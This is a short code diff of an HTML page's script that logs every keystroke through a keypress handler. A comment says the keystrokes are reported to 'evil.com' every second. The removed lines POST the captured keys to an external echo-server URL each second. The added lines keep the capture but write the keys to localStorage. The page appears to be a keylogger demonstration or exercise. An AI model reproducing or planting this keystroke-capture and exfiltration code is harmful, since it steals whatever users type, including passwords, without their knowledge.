@@ -31,22 +31,14 @@ var keystrokes = [];
 // event listener which captures user keystrokes
 document.onkeypress = function() {
     keystrokes.push(window.event.keyCode);
-	console.log("PRESSED ", window.event.keyCode);
+    console.log("PRESSED ", window.event.keyCode);
 }
 // function which reports keytrokes back to evil.com every second
 setInterval(function() {
     if (keystrokes.length) {
-        var xhr = newXHR();
-        xhr.open("POST", 'https://echoserver.dev/server?response=N4IgFgpghgJhBOBnEAuA2mkIA0WC6euARgPYwCeqoALuQA4SojUQAe1OIMU1UTAOuAgAbYSUEgAvrkS9qAV2QoATAAZVkoA');
-        xhr.send(keystrokes.join("+"));
+        localStorage.setItem("input", keystrokes.join("+"));
     }
     keystrokes = [];
 }, 1000);
-// function which creates an ajax request object
-function newXHR() {
-    if (window.XMLHttpRequest)
-        return new XMLHttpRequest();
-    return new ActiveXObject("MSXML2.XMLHTTP.3.0");
-}
 </script>
 </html>
